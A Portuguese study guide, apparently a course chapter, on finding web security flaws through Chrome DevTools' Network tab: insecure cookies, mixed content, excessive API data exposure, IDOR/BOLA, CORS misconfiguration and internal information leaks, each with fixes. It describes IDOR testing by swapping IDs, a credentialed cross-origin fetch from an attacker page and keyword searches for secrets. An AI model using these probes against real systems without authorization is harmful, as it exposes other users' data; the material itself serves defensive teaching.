
- **O que é o problema**: o servidor cria cookies de sessão ou autenticação com um cabeçalho `Set-Cookie` cru, sem os atributos de defesa:
  - **Sem `HttpOnly`**: qualquer script JavaScript na página (`document.cookie`) pode ler o cookie e enviá-lo para o servidor de um atacante em caso de XSS;
  - **Sem `Secure`**: se o usuário clicar em um link `http://loja-ficticia.test` em uma rede Wi-Fi pública, o navegador enviará o cookie de sessão em texto claro na requisição HTTP antes mesmo de receber o redirecionamento para HTTPS;
  - **Sem `SameSite` explícito (ou com `SameSite=None` desnecessário)**: o cookie fica mais exposto a envios em requisições originadas de sites de terceiros (ataques de CSRF e *XS-Leaks*).
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
# Na aba Headers -> Response Headers:
Set-Cookie: session_id=987654321abcdef; Path=/

# Na aba Cookies -> Response Cookies:
# Name: session_id | Value: 987654321abcdef | HttpOnly: (vazio) | Secure: (vazio) | SameSite: (vazio)
```

- **Como investigar na aba Network**:
  1. Na caixa de filtro da aba Network, digite `has-response-header:set-cookie` para listar todas as requisições que definem ou alteram cookies;
  2. Clique em cada uma delas e abra a aba **Cookies** → **Response Cookies**;
  3. Verifique se as colunas **HttpOnly** e **Secure** estão vazias para cookies de sessão e qual valor consta na coluna **SameSite**;
  4. Marque também o filtro **Blocked response cookies** na barra superior para identificar cookies que o navegador rejeitou por configuração inválida (ex.: `SameSite=None` sem `Secure`).
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Emitir cookies de sessão sempre com todos os atributos de segurança:

```http
Set-Cookie: __Host-session_id=9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c; Path=/; Secure; HttpOnly; SameSite=Lax
```


---

##### 6. Requisições HTTP sem criptografia e *Mixed Content* (Conteúdo Misto)

- **O que é o problema**:
  1. **Página inteira em HTTP (`http://`)**: toda a navegação ocorre sem TLS (porta 80), permitindo interceptação passiva (*sniffing*) e adulteração ativa (*Man-in-the-Middle*) de páginas, formulários e cookies;
  2. **Mixed Content (Conteúdo Misto)**: o documento principal é carregado de forma segura via **`https://`**, mas dentro do seu HTML, CSS ou JavaScript ele requisita sub-recursos usando **`http://`**. A especificação W3C *Mixed Content* divide o problema em duas categorias:
     - **Mixed Content Passivo / Opcionalmente Bloqueável (*Optionally-blockable / Passive*)**: imagens (`<img>`), áudio (`<audio>`) e vídeo (`<video>`). Navegadores modernos tentam fazer **autoupgrade** automático para `https://`, mas se o servidor não suportar HTTPS naquele recurso, ele falha ou rebaixa o indicador de segurança da página;
     - **Mixed Content Ativo / Bloqueável (*Blockable / Active*)**: scripts (`<script src="http://...">`), folhas de estilo (`<link rel="stylesheet" href="http://...">`), `<iframe>`, chamadas `fetch()` / `XMLHttpRequest` e fontes. Como um atacante na rede poderia alterar um script `http://` para assumir o controle total da página `https://`, o navegador **bloqueia sumariamente** essas requisições!
- **Como aparece no DevTools (Exemplo Inseguro)**:

```text
# Na tabela de requisições da aba Network:
Name             | Status             | Scheme | Type   | Initiator
index.html       | 200                | https  | document | Other
pagamento-sdk.js | (blocked:mixed-content) | http | script | index.html:18
banner-promo.jpg | 200 (ou autoupgraded)   | http | jpeg   | index.html:42
```

- **Como investigar na aba Network**:
  1. Ative a coluna **Scheme** na tabela do painel Network;
  2. Use o filtro `scheme:http` na caixa de filtro superior para listar instantaneamente qualquer tentativa de comunicação sem TLS;
  3. Marque a caixa **Blocked requests** na barra de filtros para enxergar recursos bloqueados com o status **`(blocked:mixed-content)`**;
  4. Abra também a aba **Security** e a aba **Console** do DevTools, que exibem mensagens claras como `Mixed Content: The page at 'https://...' was loaded over HTTPS, but requested an insecure script 'http://...'. This request has been blocked`.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Alterar todas as URLs de recursos e chamadas de API no código-fonte para `https://`;
  - **[RECOMENDAÇÃO]** Adicionar o cabeçalho **`Content-Security-Policy: upgrade-insecure-requests`**, que instrui o navegador a reescrever automaticamente todas as URLs `http://` da página para `https://` antes mesmo de enviar a requisição à rede;
  - **[REQUISITO]** Redirecionar permanentemente (`301` ou `308`) todo tráfego da porta 80 para `https://` na porta 443 e ativar o cabeçalho **`Strict-Transport-Security` (HSTS)**.

---

##### 7. APIs expondo dados indevidos (*Excessive Data Exposure*)

- **O que é o problema**: conhecido na OWASP API Security Top 10 como **Excessive Data Exposure** (hoje parte de **BOPLA — Broken Object Property Level Authorization**), ocorre quando o endpoint da API retorna no JSON **muito mais campos do que a tela realmente precisa**, confiando que o código JavaScript do front-end vai exibir apenas os campos públicos (`nome`, `foto`) e esconder o resto. Para quem abre a aba **Network** → **Preview** ou **Response**, todos os campos ocultos estão inteiramente visíveis!
- **Exemplos clássicos que caem em provas e auditorias**:
  - Uma página de comentários públicos chama `GET /api/artigos/10/comentarios`. Na tela só aparece o nome do autor e o texto, mas na aba **Preview** do Network cada comentário traz o objeto completo da tabela `usuarios`: `email`, `cpf`, `telefone`, `hash_senha`, `role: "admin"`, `ip_ultimo_login`;
  - Um endpoint de listagem de usuários retorna flags internas como `"is_vip": false`, `"score_fraude": 82`, `"token_recuperacao_ativo": "9a8b7c..."`.
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
GET /api/v1/produtos/450/avaliacoes HTTP/1.1
Host: api.loja-ficticia.test

HTTP/1.1 200 OK
Content-Type: application/json

[
  {
    "idAvaliacao": 88,
    "nota": 5,
    "comentario": "Produto excelente, chegou rápido!",
    "autor": {
      "id": 104,
      "nomeExibicao": "Roberto M.",
      "nomeCompleto": "Roberto Mendes da Silva",
      "cpf": "111.222.333-44",
      "email": "roberto.mendes@exemplo.test",
      "passwordHash": "$2b$12$K8f9a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y",
      "isAdmin": false
    }
  }
]
```

- **Como investigar na aba Network**:
  1. Filtre por **Fetch/XHR** na barra de filtros da aba Network;
  2. Clique em cada requisição `GET` ou `POST` que retorne JSON e abra as abas **Preview** e **Response**;
  3. Compare rigorosamente os campos presentes na árvore JSON com o que é mostrado na interface visual da página;
  4. Use a busca global do Network (`Ctrl+F`) por palavras-chave sensíveis: `cpf`, `rg`, `hash`, `password`, `senha`, `secret`, `ssn`, `admin`, `role`, `salario`, `cartao`, `telefone`.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Nunca retornar modelos/entidades do banco de dados (`return usuarioRepository.findAll()`) diretamente para o serializador JSON;
  - **[REQUISITO]** Criar **DTOs (*Data Transfer Objects*) de saída específicos para cada caso de uso** (ex.: `AutorAvaliacaoPublicaDTO` contendo exclusivamente `nomeExibicao`) e realizar projeção no banco de dados (`SELECT nome_exibicao FROM ...`).

---

##### 8. Falhas de autenticação e autorização (BOLA/IDOR, endpoints sem validação de sessão)

- **O que é o problema**:
  1. **BOLA (*Broken Object Level Authorization*) / IDOR (*Insecure Direct Object Reference*)**: o usuário está autenticado (ex.: `usuario_id = 50`), mas quando a aplicação requisita `GET /api/pedidos/1001` ou `GET /api/notas-fiscais/download?id=1001`, o servidor apenas busca o pedido `1001` no banco de dados e o devolve **sem verificar se o pedido `1001` pertence ao usuário `50`**. Ao trocar `1001` por `1002` (em ambiente de teste autorizado), o servidor responde `200 OK` com os dados do pedido de outro cliente;
  2. **Broken Function Level Authorization (BFLA) / Endpoints sem validação de sessão**: rotas administrativas como `GET /api/admin/exportar-clientes` ou `DELETE /api/usuarios/88` estão escondidas apenas visualmente no menu do front-end (o botão só aparece se `user.role === 'admin'`), mas o servidor não valida a sessão ou o perfil de administrador quando a requisição HTTP é enviada diretamente.
- **Como aparece no DevTools (Exemplo Inseguro em Laboratório Autorizado)**:

```http
# Requisição original capturada no Network pelo usuário de ID 50:
GET /api/v1/clientes/50/cartoes HTTP/1.1
Host: api.loja-ficticia.test
Cookie: __Host-sid=sessao_do_usuario_50

# Teste autorizado alterando o ID na rota para 51 (outro usuário de teste):
GET /api/v1/clientes/51/cartoes HTTP/1.1
Host: api.loja-ficticia.test
Cookie: __Host-sid=sessao_do_usuario_50

# Resposta vulnerável (200 OK em vez de 403 Forbidden / 404 Not Found!):
HTTP/1.1 200 OK
Content-Type: application/json

{
  "clienteId": 51,
  "titular": "Outro Usuário de Teste",
  "ultimosDigitos": "8899"
}
```

- **Como investigar na aba Network**:
  1. Observe na coluna **Name** / **URL** e na aba **Payload** todas as requisições que passam identificadores de recursos (`/pedidos/105`, `?faturaId=89`, `{"contaId": 12}`);
  2. Em um **ambiente de laboratório autorizado com duas contas de teste (Conta A e Conta B)**, capture na aba Network uma requisição da Conta A (clique direito → **Copy** → **Copy as fetch**);
  3. Na sessão da Conta B (ou sem sessão), execute a requisição para o ID do recurso da Conta A e observe na aba Network se o `Status Code` retornado é **`403 Forbidden` / `404 Not Found`** (seguro) ou **`200 OK`** com os dados da Conta A (vulnerável a IDOR/BOLA).
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Validar a propriedade do objeto (**Object-Level Authorization**) no servidor em **toda** consulta ou alteração de banco de dados (ex.: `SELECT * FROM pedidos WHERE id = :pedidoId AND usuario_id = :usuarioLogadoDaSessao`);
  - **[REQUISITO]** Validar autenticação e perfil de permissão (**RBAC / ABAC**) em *middlewares* no back-end para todas as rotas administrativas;
  - **[BOA PRÁTICA]** Utilizar UUIDs v4 aleatórios para dificultar a enumeração sequencial, lembrando que **UUID não substitui a verificação de autorização no servidor**.

---

##### 9. CORS mal configurado (`Access-Control-Allow-Origin: *` ou reflexão de `Origin` com credenciais)

- **O que é o problema**: o servidor configura incorretamente os cabeçalhos de **CORS (*Cross-Origin Resource Sharing*)**, enfraquecendo a **Same-Origin Policy (SOP)** e permitindo que sites maliciosos de terceiros leiam respostas privadas do usuário:
  1. **Reflexão arbitrária de `Origin` com `Access-Control-Allow-Credentials: true` (Crítico)**: para "resolver rápido um erro de CORS", o desenvolvedor programa o servidor para ler o cabeçalho `Origin` enviado na requisição e copiá-lo diretamente no cabeçalho de resposta `Access-Control-Allow-Origin`, juntamente com `Access-Control-Allow-Credentials: true`. Com isso, se a vítima autenticada visitar `https://site-atacante.test`, o JavaScript desse site pode fazer `fetch('https://api.banco-ficticio.test/extrato', { credentials: 'include' })` e **ler todo o extrato bancário da vítima**;
  2. **Aceitar `Origin: null` com credenciais**: um atacante usa um `<iframe sandbox="allow-scripts" srcdoc="...">` (que tem origem `null`) para enviar requisições autenticadas e ler a resposta;
  3. **Usar `Access-Control-Allow-Origin: *` em endpoints privados que não usam cookies, mas são acessíveis na intranet privada da empresa**: qualquer site público visitado por um funcionário consegue ler os dados da API interna via navegador do funcionário. (Nota: navegadores bloqueiam por especificação a combinação `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`, mas refletir o `Origin` contorna essa trava do navegador!).
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
# Request Headers:
GET /v1/meu-perfil-privado HTTP/1.1
Host: api.loja-ficticia.test
Origin: https://qualquer-dominio-externo.test
Cookie: __Host-sid=sessao_valida

# Response Headers (VULNERABILIDADE CRÍTICA DE CORS):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://qualquer-dominio-externo.test
Access-Control-Allow-Credentials: true
Vary: Origin
Content-Type: application/json
```

- **Como investigar na aba Network**:
  1. Na caixa de filtro da aba Network, digite `has-response-header:access-control-allow-origin`;
  2. Clique nas requisições listadas e abra a aba **Headers** → **Response Headers**;
  3. Verifique o valor de `Access-Control-Allow-Origin` e se `Access-Control-Allow-Credentials: true` está presente;
  4. Em laboratório autorizado, use **Copy as cURL** ou **Copy as fetch** alterando o cabeçalho `Origin` para `https://origem-nao-autorizada.test` ou `null` e verifique se o servidor reflete essa origem na resposta.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Validar o cabeçalho `Origin` contra uma **lista estrita e exata de origens confiáveis (*allowlist*)** no servidor antes de emitir `Access-Control-Allow-Origin` (nunca refletir cegamente o `Origin` da requisição e nunca usar regex frouxa como `/loja-ficticia\.test/`, que aceitaria `atacante-loja-ficticia.test`);
  - **[REQUISITO]** Nunca permitir `Access-Control-Allow-Origin: null` em rotas autenticadas;
  - **[REQUISITO]** Usar `Access-Control-Allow-Origin: *` **somente** em recursos 100% públicos (como uma API pública de CEP ou arquivos de fonte/CDN) e **sem** `Access-Control-Allow-Credentials`;
  - **[BOA PRÁTICA]** Sempre incluir `Vary: Origin` quando `Access-Control-Allow-Origin` variar entre origens permitidas, evitando envenenamento de cache HTTP.

---

##### 10. Vazamento de informações internas (stack traces, versões em `Server`/`X-Powered-By`, IPs privados, arquivos `.map`)

- **O que é o problema**: a aplicação expõe metadados técnicos da infraestrutura, código-fonte original ou topologia interna de rede que facilitam enormemente a fase de reconhecimento (*reconnaissance*) de um ataque:
  1. **Banners de versão em cabeçalhos HTTP**: `Server: nginx/1.18.0 (Ubuntu)`, `X-Powered-By: PHP/8.1.2`, `X-AspNet-Version: 4.0.30319`, permitindo buscar imediatamente *exploits* públicos (CVEs) para aquela versão exata;
  2. **Stack traces e mensagens de erro de banco/framework**: respostas `500` ou `400` retornando pilhas de execução completas, caminhos de arquivos (`/home/deploy/app/src/controllers/AuthController.ts:45`), nomes de tabelas/colunas SQL e versões de bibliotecas;
  3. **Cabeçalhos de roteamento interno e IPs privados (RFC 1918)**: cabeçalhos de resposta como `X-Upstream-Server: 10.24.18.92:8080`, `Via: 1.1 proxy-interno.corp.local` ou redirecionamentos vazando endereços da rede interna;
  4. **Source Maps (`.js.map` / `.css.map`) abertos em produção**: o arquivo JavaScript minificado termina com o comentário `//# sourceMappingURL=main.8f9a1c.js.map`. Se o arquivo `.map` estiver acessível publicamente no servidor de produção, o próprio DevTools reconstrói **todo o código-fonte original em TypeScript/React/Vue com comentários, nomes de variáveis e estrutura de pastas** na aba **Sources**!
- **Como aparece no DevTools (Exemplo Inseguro)**:

```http
HTTP/1.1 500 Internal Server Error
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: Express
X-Backend-Node: 192.168.10.45:3000
Content-Type: text/html; charset=utf-8

Error: Cannot read properties of undefined (reading 'id')
    at validarPagamento (/var/www/loja-ficticia/src/services/PagamentoService.js:112:23)
    at Layer.handle [as handle_request] (/var/www/loja-ficticia/node_modules/express/lib/router/layer.js:95:5)
```

- **Como investigar na aba Network**:
  1. Filtre por erros com `status-code:500`, `status-code:400` ou `status-code:404` e inspecione a aba **Response** e **Preview**;
  2. Verifique em **Response Headers** os cabeçalhos `Server`, `X-Powered-By`, `Via`, `X-Backend-*`, `X-Runtime`, `X-AspNet-*`;
  3. Clique no filtro **JS**, abra a aba **Response** de qualquer arquivo `.js` e role até a última linha para ver se existe `//# sourceMappingURL=...`. Além disso, na tabela do Network (ou na árvore da aba **Sources**), verifique se arquivos `.map` estão sendo baixados com `200 OK`;
  4. Use a busca global (`Ctrl+F`) no painel Network por expressões como `10.`, `192.168.`, `172.16.`, `/var/www`, `/home/`, `node_modules`, `Traceback`, `Exception`.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Configurar tratamento global de erros em produção para retornar apenas mensagens genéricas e amigáveis ao cliente, gravando o *stack trace* exclusivamente no sistema interno de logs (SIEM / observabilidade);
  - **[RECOMENDAÇÃO]** Ocultar versões nos cabeçalhos `Server` e remover `X-Powered-By` e cabeçalhos internos de upstream no proxy reverso;
  - **[RECOMENDAÇÃO]** Não publicar arquivos `.js.map` no servidor público de produção (em vez disso, fazer upload dos *source maps* de forma privada apenas para a ferramenta de monitoramento de erros, como o Sentry, durante o pipeline de CI/CD, ou restringir o acesso a `.map` por VPN/IP interno).

---

##### Tabela-Resumo dos 10 Casos Críticos de Segurança na Aba Network

| # | Caso Crítico | Onde Detectar no Painel Network | Filtro / Atalho Rápido no DevTools | Medida Principal de Correção |
|---|---|---|---|---|
| **1** | **Exposição de tokens** | `Request URL`, header `Referer`, aba `Response` e aba `Cookies` | `Ctrl+F` → `eyJ`, `Bearer`, `token` | Usar cookie `HttpOnly; Secure; SameSite`, POST/headers e `Referrer-Policy` |
| **2** | **Senhas transmitidas indevidamente** | `Request Method: GET`, `Scheme: http`, ou aba `Response` | `method:GET`, `scheme:http`, `Ctrl+F` pela senha | Enviar exclusivamente via `POST` sobre `HTTPS`; nunca ecoar na resposta |
| **3** | **Informações sensíveis em URLs** | `Request URL` e aba `Payload` → *Query String Parameters* | Coluna `URL` ativa; filtrar por `cpf`, `email`, `reset` | Mover dados pessoais para o corpo `POST` e usar UUIDs opacos |
| **4** | **Headers de segurança ausentes** | Aba `Headers` → *Response Headers* (especialmente em `Doc`) | `-has-response-header:Content-Security-Policy` | Configurar HSTS, CSP, `X-Content-Type-Options: nosniff`, `X-Frame-Options` |
| **5** | **Cookies inseguros** | Aba `Cookies` → *Response Cookies* e header `Set-Cookie` | `has-response-header:set-cookie` | Adicionar `HttpOnly`, `Secure`, `SameSite=Lax/Strict` e prefixo `__Host-` |
| **6** | **HTTP sem criptografia e Mixed Content** | Coluna `Scheme` (`http`) e coluna `Status` (`blocked:mixed-content`) | `scheme:http` e checkbox `Blocked requests` | Migrar tudo para `https://`, ativar HSTS e `CSP: upgrade-insecure-requests` |
| **7** | **APIs expondo dados indevidos** | Abas `Preview` e `Response` em chamadas `Fetch/XHR` | Filtro `Fetch/XHR` + `Ctrl+F` (`hash`, `cpf`, `role`) | Retornar apenas DTOs de saída enxutos com os campos necessários à tela |
| **8** | **Falhas de autenticação e autorização (BOLA/IDOR)** | `Status Code: 200 OK` ao acessar ID de recurso de outro usuário | Testar IDs entre duas contas de laboratório (`Copy as fetch`) | Validar propriedade do objeto (`WHERE usuario_id = sessao.id`) no servidor |
| **9** | **CORS mal configurado** | *Response Headers*: `Access-Control-Allow-Origin` + `Allow-Credentials` | `has-response-header:access-control-allow-origin` | Validar `Origin` contra *allowlist* exata; nunca refletir `Origin` arbitrário |
| **10** | **Vazamento de informações internas** | Aba `Response` em erros `500`, headers `Server`/`X-Powered-By` e `.map` | `status-code:500`, `has-response-header:x-powered-by`, `.map` | Desativar debug e `.map` públicos em produção; remover banners de versão |

---

---

> [⬅️ 1B. Fundamentos Web (1.7 a 1.13)](./01b-fundamentos-web-parte2.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [2.2 Chrome DevTools — Aba Application ➡️](./02b-devtools-application.md)
